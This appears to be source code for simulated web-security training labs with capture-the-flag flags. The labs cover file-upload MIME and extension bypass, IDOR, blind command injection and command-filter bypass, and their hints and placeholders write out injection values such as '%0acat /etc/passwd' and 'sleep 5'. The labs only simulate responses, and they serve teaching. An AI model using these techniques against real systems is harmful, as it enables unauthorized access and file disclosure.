/* ============ File Upload MIME Bypass ============ */
export function FileMimeBypassLab({ onFlagFound }: LabProps) {
  const [fileName, setFileName] = useState("");
  const [mimeType, setMimeType] = useState("image/jpeg");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);

  const handle = () => {
    const isDangerous = /\.(php|jsp|asp)/i.test(fileName);
    const isFakeMime = !/php|jsp|asp/i.test(mimeType);
    if (isDangerous && isFakeMime && !done) {
      setDone(true);
      setOutput(`Upload accepted!\nFile: ${fileName}\nContent-Type: ${mimeType} ✅ (server only checks MIME)\n\n⚠️ Server validated Content-Type but not actual file content!\n📁 /uploads/${fileName} is now executable!\n\n🎉 FLAG{file_mime_bypass}`);
      onFlagFound?.("FLAG{file_mime_bypass}");
    } else if (isDangerous) {
      setOutput(`❌ Rejected: Content-Type ${mimeType} not allowed.\n\n💡 Change the Content-Type to image/jpeg while keeping the .php extension!`);
    } else {
      setOutput(`✅ Uploaded: ${fileName || "photo.jpg"}\n\n💡 Upload a .php file but set Content-Type to image/jpeg.`);
    }
  };

  return (
    <LabShell url="vulnerable-app.local/upload">
      <h3 className="mb-2 text-lg font-bold">📤 File Upload (MIME Check)</h3>
      <p className="text-xs text-muted-foreground mb-4">Server checks Content-Type header only.</p>
      <div className="space-y-2 mb-4 max-w-sm">
        <input value={fileName} onChange={e => setFileName(e.target.value)} placeholder="shell.php" className="w-full rounded-md border border-border/50 bg-background/50 px-3 py-2 text-sm font-mono focus:border-primary focus:outline-none" dir="ltr" />
        <select value={mimeType} onChange={e => setMimeType(e.target.value)} className="w-full rounded-md border border-border/50 bg-background/50 px-3 py-2 text-sm font-mono focus:border-primary focus:outline-none">
          <option value="application/x-php">application/x-php</option>
          <option value="image/jpeg">image/jpeg</option>
          <option value="image/png">image/png</option>
          <option value="text/plain">text/plain</option>
        </select>
        <button onClick={handle} className="w-full rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground hover:bg-primary/90">Upload</button>
      </div>
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

/* ============ File Upload Extension Bypass ============ */
export function FileExtBypassLab({ onFlagFound }: LabProps) {
  const [fileName, setFileName] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);

  const handle = () => {
    const isBlocked = /\.php$/i.test(fileName);
    const isBypass = /\.(phtml|php5|phar|phps|pHp|PhP)$/i.test(fileName);
    if (isBypass && !done) {
      setDone(true);
      setOutput(`✅ Upload accepted: ${fileName}\n\n⚠️ .php is blocked but ${fileName.split(".").pop()} is not!\nApache still executes this as PHP!\n\n🎉 FLAG{file_ext_bypass}`);
      onFlagFound?.("FLAG{file_ext_bypass}");
    } else if (isBlocked) {
      setOutput(`❌ Blocked: .php files are not allowed!\n\n💡 Try alternative extensions: .phtml, .php5, .phar, .phps`);
    } else {
      setOutput(`✅ Uploaded: ${fileName || "image.jpg"}\n(Safe file)\n\n💡 Upload a PHP shell with an alternative extension.`);
    }
  };

  return (
    <LabShell url="vulnerable-app.local/upload">
      <h3 className="mb-2 text-lg font-bold">📤 File Upload (Extension Blacklist)</h3>
      <p className="text-xs text-muted-foreground mb-4">Server blocks .php files. Find alternative extensions.</p>
      <InputRow value={fileName} onChange={setFileName} onSubmit={handle} placeholder="shell.phtml" buttonText="Upload" />
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

/* ============ IDOR API Messages ============ */
export function IDORApiLab({ onFlagFound }: LabProps) {
  const [id, setId] = useState("50");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);

  const handle = () => {
    if ((id === "1" || id === "2") && !done) {
      setDone(true);
      setOutput(`GET /api/messages/${id}\n\n{\n  "id": ${id},\n  "from": "CEO",\n  "to": "CFO",\n  "content": "The merger deal is worth $50M. Keep confidential.",\n  "secret": "FLAG{idor_api_messages}"\n}\n\n⚠️ No authorization check on message API!`);
      onFlagFound?.("FLAG{idor_api_messages}");
    } else {
      setOutput(`GET /api/messages/${id}\n\n{\n  "id": ${id},\n  "from": "you",\n  "to": "support",\n  "content": "Hello, I need help."\n}\n\n💡 Your messages are ID 50+. Try lower IDs to read others' messages.`);
    }
  };

  return (
    <LabShell url={`vulnerable-app.local/api/messages/${id}`}>
      <h3 className="mb-2 text-lg font-bold">💬 Message API</h3>
      <InputRow value={id} onChange={setId} onSubmit={handle} placeholder="1" prefix="/api/messages/" buttonText="Fetch" />
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

/* ============ Cmd Injection Blind ============ */
export function CmdBlindLab({ onFlagFound }: LabProps) {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);
  const [loading, setLoading] = useState(false);

  const handle = () => {
    const hasSleep = /sleep|ping\s+-c\s+[3-9]/i.test(input);
    if (hasSleep && !done) {
      setLoading(true);
      setOutput("Processing...");
      setTimeout(() => {
        setLoading(false);
        setDone(true);
        setOutput(`Response time: 5.03 seconds (normal: 0.1s)\n\n✅ Time delay confirmed command execution!\n\n🎉 FLAG{cmd_blind_injection}`);
        onFlagFound?.("FLAG{cmd_blind_injection}");
      }, 3000);
    } else {
      setOutput(`Lookup result: Host ${input || "example.com"} found.\n\n(No command output shown)\n\n💡 Use time delays (sleep 5) to confirm command execution.`);
    }
  };

  return (
    <LabShell url="vulnerable-app.local/dns-lookup">
      <h3 className="mb-2 text-lg font-bold">🌐 DNS Lookup (No Output)</h3>
      <p className="text-xs text-muted-foreground mb-4">Command output is not shown. Use time-based techniques.</p>
      <InputRow value={input} onChange={setInput} onSubmit={handle} placeholder="example.com; sleep 5" buttonText={loading ? "⏳..." : "Lookup"} />
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

/* ============ Cmd Injection Filter Bypass ============ */
export function CmdFilterBypassLab({ onFlagFound }: LabProps) {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);

  const handle = () => {
    const hasBlocked = /[;|&]/.test(input);
    const hasBypass = /%0a|\$\(|`/.test(input) || /\n/.test(input);
    if (hasBlocked && !hasBypass) {
      setOutput(`🛡️ BLOCKED: Characters ; | & are not allowed!\n\n💡 Try newlines (%0a), command substitution $(), or backticks.`);
    } else if (hasBypass && !done) {
      setDone(true);
      setOutput(`$ nslookup ${input}\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin\n\n✅ Filter bypassed with alternative separator!\n\n🎉 FLAG{cmd_filter_bypass}`);
      onFlagFound?.("FLAG{cmd_filter_bypass}");
    } else {
      setOutput(`$ nslookup ${input || "example.com"}\nServer: 8.8.8.8\nAddress: 93.184.216.34\n\n💡 Common separators (; | &) are filtered. Find alternatives!`);
    }
  };

  return (
    <LabShell url="vulnerable-app.local/nslookup">
      <h3 className="mb-2 text-lg font-bold">🌐 DNS Lookup (Filtered)</h3>
      <p className="text-xs text-muted-foreground mb-4">Semicolons, pipes, and ampersands are blocked.</p>
      <InputRow value={input} onChange={setInput} onSubmit={handle} placeholder="example.com%0acat /etc/passwd" buttonText="Lookup" />
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

/* ============ Simulated Alert (shared) ============ */
function SimAlert({ msg, onClose }: { msg: string; onClose: () => void }) {
  return (
    <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/60 backdrop-blur-sm animate-in fade-in">
      <div className="bg-[#f0f0f0] border-2 border-[#999] rounded shadow-2xl w-[400px] max-w-[90vw]">
        <div className="bg-gradient-to-r from-[#0078d7] to-[#005a9e] px-4 py-2">
          <span className="text-white text-sm font-bold">JavaScript Alert</span>
        </div>
        <div className="p-6 text-center">
          <p className="text-[#333] font-mono text-sm mb-6 break-all">{msg}</p>
          <button onClick={onClose} className="bg-[#e1e1e1] hover:bg-[#d0d0d0] border border-[#adadad] rounded px-8 py-1.5 text-sm text-[#333]">OK</button>
        </div>
      </div>
    </div>
  );
}
